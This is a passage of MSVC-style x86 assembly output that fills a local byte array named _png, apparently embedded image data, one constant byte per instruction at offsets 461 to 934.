	mov	BYTE PTR _png$[ebp+461], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+462], -5		; fffffffbH
	mov	BYTE PTR _png$[ebp+463], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+464], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+465], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+466], -1
	mov	BYTE PTR _png$[ebp+467], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+468], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+469], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+470], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+471], 7
	mov	BYTE PTR _png$[ebp+472], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+473], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+474], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+475], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+476], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+477], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+478], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+479], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+480], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+481], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+482], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+483], -2		; fffffffeH
	mov	BYTE PTR _png$[ebp+484], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+485], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+486], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+487], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+488], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+489], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+490], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+491], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+492], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+493], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+494], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+495], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+496], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+497], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+498], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+499], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+500], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+501], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+502], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+503], -128		; ffffff80H
	mov	BYTE PTR _png$[ebp+504], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+505], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+506], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+507], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+508], -80		; ffffffb0H
	mov	BYTE PTR _png$[ebp+509], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+510], 87		; 00000057H
	mov	BYTE PTR _png$[ebp+511], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+512], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+513], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+514], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+515], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+516], -97		; ffffff9fH
	mov	BYTE PTR _png$[ebp+517], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+518], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+519], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+520], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+521], -26		; ffffffe6H
	mov	BYTE PTR _png$[ebp+522], 73		; 00000049H
	mov	BYTE PTR _png$[ebp+523], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+524], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+525], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+526], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+527], 98		; 00000062H
	mov	BYTE PTR _png$[ebp+528], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+529], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+530], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+531], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+532], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+533], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+534], 114		; 00000072H
	mov	BYTE PTR _png$[ebp+535], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+536], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+537], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+538], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+539], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+540], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+541], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+542], 110		; 0000006eH
	mov	BYTE PTR _png$[ebp+543], -106		; ffffff96H
	mov	BYTE PTR _png$[ebp+544], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+545], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+546], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+547], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+548], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+549], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+550], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+551], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+552], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+553], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+554], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+555], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+556], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+557], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+558], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+559], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+560], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+561], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+562], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+563], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+564], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+565], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+566], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+567], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+568], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+569], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+570], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+571], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+572], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+573], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+574], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+575], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+576], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+577], -81		; ffffffafH
	mov	BYTE PTR _png$[ebp+578], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+579], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+580], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+581], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+582], -37		; ffffffdbH
	mov	BYTE PTR _png$[ebp+583], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+584], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+585], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+586], 86		; 00000056H
	mov	BYTE PTR _png$[ebp+587], 4
	mov	BYTE PTR _png$[ebp+588], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+589], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+590], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+591], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+592], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+593], -104		; ffffff98H
	mov	BYTE PTR _png$[ebp+594], -117		; ffffff8bH
	mov	BYTE PTR _png$[ebp+595], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+596], 46		; 0000002eH
	mov	BYTE PTR _png$[ebp+597], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+598], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+599], 2
	mov	BYTE PTR _png$[ebp+600], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+601], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+602], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+603], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+604], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+605], 33		; 00000021H
	mov	BYTE PTR _png$[ebp+606], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+607], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+608], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+609], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+610], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+611], -53		; ffffffcbH
	mov	BYTE PTR _png$[ebp+612], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+613], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+614], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+615], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+616], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+617], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+618], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+619], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+620], 86		; 00000056H
	mov	BYTE PTR _png$[ebp+621], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+622], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+623], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+624], -13		; fffffff3H
	mov	BYTE PTR _png$[ebp+625], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+626], -124		; ffffff84H
	mov	BYTE PTR _png$[ebp+627], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+628], 65		; 00000041H
	mov	BYTE PTR _png$[ebp+629], 59		; 0000003bH
	mov	BYTE PTR _png$[ebp+630], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+631], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+632], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+633], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+634], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+635], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+636], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+637], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+638], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+639], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+640], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+641], 59		; 0000003bH
	mov	BYTE PTR _png$[ebp+642], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+643], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+644], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+645], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+646], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+647], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+648], -92		; ffffffa4H
	mov	BYTE PTR _png$[ebp+649], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+650], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+651], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+652], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+653], -4		; fffffffcH
	mov	BYTE PTR _png$[ebp+654], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+655], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+656], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+657], -106		; ffffff96H
	mov	BYTE PTR _png$[ebp+658], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+659], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+660], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+661], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+662], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+663], -32		; ffffffe0H
	mov	BYTE PTR _png$[ebp+664], 59		; 0000003bH
	mov	BYTE PTR _png$[ebp+665], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+666], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+667], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+668], 5
	mov	BYTE PTR _png$[ebp+669], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+670], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+671], 1
	mov	BYTE PTR _png$[ebp+672], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+673], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+674], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+675], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+676], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+677], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+678], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+679], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+680], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+681], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+682], -7		; fffffff9H
	mov	BYTE PTR _png$[ebp+683], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+684], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+685], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+686], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+687], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+688], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+689], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+690], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+691], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+692], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+693], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+694], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+695], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+696], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+697], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+698], 0
	mov	BYTE PTR _png$[ebp+699], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+700], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+701], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+702], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+703], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+704], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+705], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+706], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+707], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+708], -128		; ffffff80H
	mov	BYTE PTR _png$[ebp+709], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+710], 17		; 00000011H
	mov	BYTE PTR _png$[ebp+711], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+712], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+713], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+714], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+715], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+716], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+717], 9
	mov	BYTE PTR _png$[ebp+718], 4
	mov	BYTE PTR _png$[ebp+719], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+720], -12		; fffffff4H
	mov	BYTE PTR _png$[ebp+721], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+722], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+723], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+724], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+725], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+726], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+727], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+728], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+729], -128		; ffffff80H
	mov	BYTE PTR _png$[ebp+730], -122		; ffffff86H
	mov	BYTE PTR _png$[ebp+731], 121		; 00000079H
	mov	BYTE PTR _png$[ebp+732], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+733], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+734], -108		; ffffff94H
	mov	BYTE PTR _png$[ebp+735], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+736], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+737], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+738], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+739], 3
	mov	BYTE PTR _png$[ebp+740], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+741], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+742], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+743], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+744], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+745], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+746], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+747], 105		; 00000069H
	mov	BYTE PTR _png$[ebp+748], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+749], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+750], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+751], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+752], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+753], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+754], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+755], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+756], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+757], 2
	mov	BYTE PTR _png$[ebp+758], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+759], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+760], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+761], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+762], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+763], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+764], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+765], -122		; ffffff86H
	mov	BYTE PTR _png$[ebp+766], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+767], 2
	mov	BYTE PTR _png$[ebp+768], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+769], -13		; fffffff3H
	mov	BYTE PTR _png$[ebp+770], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+771], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+772], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+773], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+774], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+775], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+776], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+777], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+778], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+779], 72		; 00000048H
	mov	BYTE PTR _png$[ebp+780], 5
	mov	BYTE PTR _png$[ebp+781], -22		; ffffffeaH
	mov	BYTE PTR _png$[ebp+782], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+783], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+784], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+785], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+786], 8
	mov	BYTE PTR _png$[ebp+787], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+788], 4
	mov	BYTE PTR _png$[ebp+789], 126		; 0000007eH
	mov	BYTE PTR _png$[ebp+790], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+791], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+792], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+793], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+794], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+795], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+796], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+797], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+798], 98		; 00000062H
	mov	BYTE PTR _png$[ebp+799], 81		; 00000051H
	mov	BYTE PTR _png$[ebp+800], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+801], -81		; ffffffafH
	mov	BYTE PTR _png$[ebp+802], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+803], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+804], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+805], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+806], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+807], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+808], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+809], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+810], -125		; ffffff83H
	mov	BYTE PTR _png$[ebp+811], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+812], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+813], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+814], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+815], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+816], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+817], 3
	mov	BYTE PTR _png$[ebp+818], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+819], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+820], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+821], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+822], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+823], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+824], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+825], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+826], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+827], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+828], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+829], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+830], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+831], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+832], 16		; 00000010H
	mov	BYTE PTR _png$[ebp+833], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+834], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+835], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+836], -127		; ffffff81H
	mov	BYTE PTR _png$[ebp+837], -12		; fffffff4H
	mov	BYTE PTR _png$[ebp+838], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+839], -114		; ffffff8eH
	mov	BYTE PTR _png$[ebp+840], 92		; 0000005cH
	mov	BYTE PTR _png$[ebp+841], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+842], 5
	mov	BYTE PTR _png$[ebp+843], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+844], 44		; 0000002cH
	mov	BYTE PTR _png$[ebp+845], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+846], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+847], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+848], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+849], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+850], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+851], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+852], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+853], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+854], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+855], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+856], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+857], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+858], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+859], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+860], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+861], -26		; ffffffe6H
	mov	BYTE PTR _png$[ebp+862], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+863], 32		; 00000020H
	mov	BYTE PTR _png$[ebp+864], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+865], 45		; 0000002dH
	mov	BYTE PTR _png$[ebp+866], 56		; 00000038H
	mov	BYTE PTR _png$[ebp+867], 9
	mov	BYTE PTR _png$[ebp+868], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+869], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+870], -16		; fffffff0H
	mov	BYTE PTR _png$[ebp+871], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+872], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+873], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+874], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+875], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+876], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+877], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+878], 88		; 00000058H
	mov	BYTE PTR _png$[ebp+879], 28		; 0000001cH
	mov	BYTE PTR _png$[ebp+880], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+881], 9
	mov	BYTE PTR _png$[ebp+882], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+883], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+884], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+885], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+886], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+887], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+888], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+889], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+890], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+891], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+892], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+893], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+894], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+895], -107		; ffffff95H
	mov	BYTE PTR _png$[ebp+896], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+897], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+898], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+899], 3
	mov	BYTE PTR _png$[ebp+900], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+901], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+902], 121		; 00000079H
	mov	BYTE PTR _png$[ebp+903], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+904], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+905], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+906], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+907], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+908], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+909], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+910], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+911], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+912], 81		; 00000051H
	mov	BYTE PTR _png$[ebp+913], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+914], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+915], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+916], -77		; ffffffb3H
	mov	BYTE PTR _png$[ebp+917], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+918], -100		; ffffff9cH
	mov	BYTE PTR _png$[ebp+919], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+920], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+921], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+922], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+923], 0
	mov	BYTE PTR _png$[ebp+924], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+925], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+926], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+927], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+928], 3
	mov	BYTE PTR _png$[ebp+929], 9
	mov	BYTE PTR _png$[ebp+930], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+931], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+932], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+933], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+934], -7		; fffffff9H
